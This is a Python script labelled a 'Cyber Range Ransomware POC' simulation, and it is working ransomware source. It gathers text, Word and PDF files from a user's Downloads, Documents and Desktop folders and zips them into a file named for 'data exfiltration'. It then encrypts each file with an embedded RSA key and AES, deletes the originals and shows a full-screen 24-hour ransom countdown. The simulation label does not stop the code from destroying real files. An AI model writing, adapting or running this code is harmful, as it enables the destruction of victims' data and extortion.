import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk
import pyzipper
import socket

# Public key with base64 encoding
pubKey = """LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzcHZCMTJnd1RvbDdtWWtXTlVVbQp5RXp5a29nL2gvTS92ZTJvNlUyZTdPWTBxK2IyeUNzUzlSb2VOVEpjbnYxc3hwUHJKdDNSaXpGUzNCNEpsOGE1CkpqMXdGa2I4RXIrN2M4U2dLRXpKcVNoTk5xNnFCWWtHbmZRM056eklOKzdVMHZIN1BvU21ha3hNSVdYYjNQVzUKTTFoNnJmd1hwSnpoU0JBcTZjREJhSVJOVC83NlFoSmtibHNacTdLVDI3ck1sTDZGaUtVZkE5WXc4OVY4Q1RSTgpBQ2p0K25jekp3UFZBRmtCWWc0K1U3aDNmYnJDL1JJVGRMbCt6WVJFdExqREhCNjJ3Y2xOM0lNRVo3K1FvMFE3CnJGeE9OV0JNUG4vRDhEMTBDQUdlRHp4VTFYclVEOTFBNHA1b2VGQTJjOWE3RFdUOWQvNzk0S0JJb2dMTUdMaW4KOVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"""
pubKey = base64.b64decode(pubKey)

def scanRecurse(baseDir):
    '''
    Scanning and finding all the files that match criteria in whitelist extensions
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt(dataFile, publicKey):
    '''
    Encrypting using RSA for the session key and AES for the data.
    '''
    # Read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # Convert data to bytes
    data = bytes(data)

    # Create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # Encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # Encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Save the encrypted data to file
    fileName = dataFile.split(extension)[0]
    fileExtension = '.CyberRange'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

def countdown(count):
    '''
    Displays a countdown timer.
    '''
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

root = tk.Tk()
root.title('Cyber Range Ransomware')
root.attributes('-fullscreen', True)  # Set full screen
label1 = tk.Label(root, text='CYBERRANGE RANSOMWARE POC', font=('calibri', 100,'bold'))
label1.pack()
label2 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n', font=('calibri', 50,'bold'))
label2.pack()
label = tk.Label(root,font=('calibri', 300,'bold'), fg='red', bg='black')
label.pack()

# Whitelist of file extensions to be encrypted
whitelist = ['.txt', '.docx', '.pdf']  # Add more extensions as needed

# Get the current user's home directory
user_home = Path.home()

# Directories to scan within the current user's home directory
directories = [
    user_home / 'Downloads',
    user_home / 'Documents',
    user_home / 'Desktop'
]

files_to_zip = []  # List to hold files to be zipped

for directory in directories:
    for item in scanRecurse(directory): 
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in whitelist:
            files_to_zip.append(filePath)  # Add file to list of files to be zipped

# Get the IP address
ip_address = socket.gethostbyname(socket.gethostname())

# Specify the full path for the zip file in C:/temp
zip_directory = 'C:/temp'
zip_file_name = 'data_exfiltration_' + ip_address + '.zip'
zip_file_path = os.path.join(zip_directory, zip_file_name)

# Create the directory if it doesn't exist
if not os.path.exists(zip_directory):
    os.makedirs(zip_directory)

# Zip all the files in files_to_zip list with password protection
if files_to_zip:
    with pyzipper.AESZipFile(zip_file_path, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(b"p@ssw0rd")
        for file in files_to_zip:
            zf.write(file, arcname=file.name)

# Encrypt files after zipping
for file in files_to_zip:
    encrypt(file, pubKey)

# Start the countdown timer    
countdown('24:00:00')
root.mainloop()
